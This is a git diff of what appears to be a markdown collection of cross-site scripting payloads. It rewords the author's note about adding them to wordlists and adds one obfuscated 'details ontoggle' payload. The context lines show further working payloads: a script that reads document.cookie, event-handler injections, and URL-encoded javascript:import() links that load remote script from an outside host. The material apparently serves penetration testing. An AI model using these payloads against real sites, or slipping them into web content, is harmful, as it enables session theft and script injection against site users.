@@ -42,7 +42,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   --- Important Note ---
   --- Please do consider that those payloads are used not for fuzzing nor to be added to a wordlist, ---
   --- there are many payloads here that would need additional actions to properly work. ---
-  --- But of course, if you do wish to add them to a wordlist, then there's no problem at all! ---
+  --- But of course, if you do wish to add some of them to a wordlist, then there's no problem at all! ---
   --- I also add commentary about every/most of the payloads in the commit history --
   
   <script>alert(document.domain+"\n\n"+document.cookie);<script>
@@ -257,6 +257,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   %3Cxss%20contenteditable%20onbeforeinput=alert(1)%3Etest
   %27%3E%0A%3C!--%3E%3Ca%20href=%22javascript:import(%27%2f%2fX55.is%27)%22%3ECLICK%3C/a%3E%0A%3C!--%3E
   %22bestxss=%3E%3Cxss%20contenteditable%20onbeforeinput=%22a='import(%60/%09/x55.is//%60)';b='javascript:';location=b%2Ba%22%3ESEARCHHERE%3C!--.html
+  <details open onToGgle=abc=(co\u006efirm);abc(VulneravelXSS&#00000000000000000041//
   ```
 </details>
 
